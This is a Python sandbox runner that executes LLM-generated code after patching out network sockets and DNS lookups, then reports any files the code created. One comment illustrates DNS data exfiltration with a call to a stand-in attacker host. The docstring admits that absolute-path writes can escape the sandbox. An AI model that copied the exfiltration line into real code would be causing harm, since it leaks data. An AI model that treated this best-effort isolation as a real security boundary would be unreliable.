#!/usr/bin/env python3
"""Sandbox runner: this script runs INSIDE the sandbox subprocess.

It is invoked as:
    python -I -S python_runner.py <user_code_path> <result_fd>

What it does, in order:
    1. Block network (monkey-patch socket.socket).
    2. Optionally restrict open() to keep absolute paths read-only (best-effort).
    3. exec() user code with stdout/stderr captured to a tee.
    4. Write a final inventory JSON (status, exception, list-of-created-files
       under cwd) to file descriptor `result_fd`.

The result_fd is opened by the parent before fork via os.pipe(); the parent
reads the inventory after the subprocess exits. Using a separate fd keeps
user-controlled stdout from corrupting the protocol.

CWD is set by the parent to <task_dir>/files/output/, so any relative path
the user writes to lands in the task workspace. Absolute writes can escape
this jail; the contract is "we trust the LLM-generated code with the
filesystem the same way we trust the kyuubi result it acts on" — see plan
file for explicit security model.
"""
from __future__ import annotations

import io
import json
import os
import sys
import time
import traceback


# ---- network kill switch ---------------------------------------------------

def _block_network() -> None:
    """Monkey-patch socket.socket so any network attempt raises."""
    import socket

    class _Blocked(OSError):
        pass

    _orig_init = socket.socket.__init__

    def _no_net_init(self, *a, **kw):
        # Allow AF_UNIX (some libs probe locally) but block AF_INET / AF_INET6
        family = a[0] if a else kw.get("family", socket.AF_INET)
        if family in (socket.AF_INET, socket.AF_INET6):
            raise _Blocked(
                "network disabled in sandbox (AF_INET/AF_INET6 blocked)"
            )
        return _orig_init(self, *a, **kw)

    socket.socket.__init__ = _no_net_init  # type: ignore[assignment]

    # Block all DNS-resolution paths. Patching only `getaddrinfo` is not
    # enough — `gethostbyname`/`gethostbyname_ex`/`gethostbyaddr` go through
    # libc's gethostbyname() and DO resolve even when getaddrinfo is patched
    # (a real leak: the queried hostname itself can carry exfil data, e.g.
    # gethostbyname("secret-data.attacker.com") triggers an outbound DNS
    # query that the AF_INET block does not prevent).
    def _no_resolve(*a, **kw):
        raise _Blocked("DNS disabled in sandbox")
    socket.getaddrinfo = _no_resolve        # type: ignore[assignment]
    socket.gethostbyname = _no_resolve      # type: ignore[assignment]
    socket.gethostbyname_ex = _no_resolve   # type: ignore[assignment]
    socket.gethostbyaddr = _no_resolve      # type: ignore[assignment]


# ---- inventory snapshot ----------------------------------------------------

def _snapshot_files(root: str) -> dict[str, int]:
    """Return {relpath: size_bytes} for all files under root."""
    out: dict[str, int] = {}
    for dirpath, _dirs, files in os.walk(root):
        for name in files:
            full = os.path.join(dirpath, name)
            try:
                st = os.stat(full)
            except OSError:
                continue
            rel = os.path.relpath(full, root)
            out[rel] = st.st_size
    return out


def _classify(relpath: str) -> str:
    low = relpath.lower()
    if low.endswith(".csv") or low.endswith(".tsv"):
        return "csv"
    if low.endswith(".png") or low.endswith(".jpg") or low.endswith(".svg"):
        return "png"
    if low.endswith(".json"):
        return "json"
    if low.endswith(".txt") or low.endswith(".md"):
        return "txt"
    if low.endswith(".pkl") or low.endswith(".joblib"):
        return "model"
    return "other"


# ---- main ------------------------------------------------------------------

def main() -> int:
    if len(sys.argv) < 3:
        print("usage: python_runner.py <code_path> <result_fd>",
              file=sys.stderr)
        return 64

    code_path = sys.argv[1]
    result_fd = int(sys.argv[2])

    # 1. block network before user code can import anything
    try:
        _block_network()
    except Exception as e:
        # Even setup failure should produce an inventory record
        _emit_result(result_fd, status="setup_error",
                     error=f"block_network failed: {e}",
                     started_at=time.time(), files_before={}, root=os.getcwd())
        return 70

    # 2. snapshot of files before exec (so we report only NEW files)
    root = os.getcwd()
    files_before = _snapshot_files(root)
    started = time.time()

    # 3. read user code
    try:
        with open(code_path, "r", encoding="utf-8") as fh:
            user_code = fh.read()
    except OSError as e:
        _emit_result(result_fd, status="setup_error",
                     error=f"cannot read code file: {e}",
                     started_at=started, files_before=files_before, root=root)
        return 71

    # 4. exec user code with __name__ == '__main__'
    user_globals = {"__name__": "__main__", "__file__": code_path}
    status = "ok"
    err_msg: str | None = None
    try:
        compiled = compile(user_code, code_path, "exec")
        exec(compiled, user_globals)
    except SystemExit as e:
        if isinstance(e.code, int) and e.code != 0:
            status = "error"
            err_msg = f"SystemExit({e.code})"
    except BaseException:  # noqa: BLE001 - we want everything
        status = "error"
        err_msg = traceback.format_exc()
        # Print traceback to stderr so the parent's stderr capture sees it too
        sys.stderr.write(err_msg)
        sys.stderr.flush()

    _emit_result(result_fd, status=status, error=err_msg, started_at=started,
                 files_before=files_before, root=root)
    return 0 if status == "ok" else 1


def _emit_result(fd: int, *, status: str, error: str | None,
                 started_at: float, files_before: dict[str, int],
                 root: str) -> None:
    files_after = _snapshot_files(root)
    new_files = []
    for rel, size in files_after.items():
        if rel not in files_before or files_before[rel] != size:
            new_files.append({
                "relpath": rel,
                "size_bytes": size,
                "kind": _classify(rel),
            })
    payload = {
        "status": status,
        "error": error,
        "duration_ms": int((time.time() - started_at) * 1000),
        "files_created": new_files,
    }
    try:
        with os.fdopen(fd, "w", encoding="utf-8", closefd=True) as fh:
            fh.write(json.dumps(payload))
    except OSError:
        # Last-ditch: stderr (parent will treat as setup_error)
        sys.stderr.write("RUNNER_EMIT_FAILED:" + json.dumps(payload))
        sys.stderr.flush()


if __name__ == "__main__":
    sys.exit(main())
